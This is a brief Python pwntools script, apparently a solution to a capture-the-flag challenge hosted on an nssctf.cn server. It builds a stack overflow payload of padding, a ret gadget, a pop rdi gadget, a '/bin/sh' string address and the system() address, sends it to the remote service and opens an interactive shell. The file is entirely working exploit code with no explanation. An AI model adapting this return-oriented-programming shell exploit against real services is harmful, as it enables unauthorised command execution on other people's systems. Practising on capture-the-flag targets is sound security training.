from pwn import*

p = remote("node4.anna.nssctf.cn", 23161)

system_add = 0x0400430
ret_add = 0x0400416
pop_rdi_add = 0x04005e3
bin_sh_add = 0x0400541

payload = b'a' * (0x10+8) + p64(ret_add) + p64(pop_rdi_add) + p64(bin_sh_add) + p64(system_add)

p.sendline(payload)
p.interactive()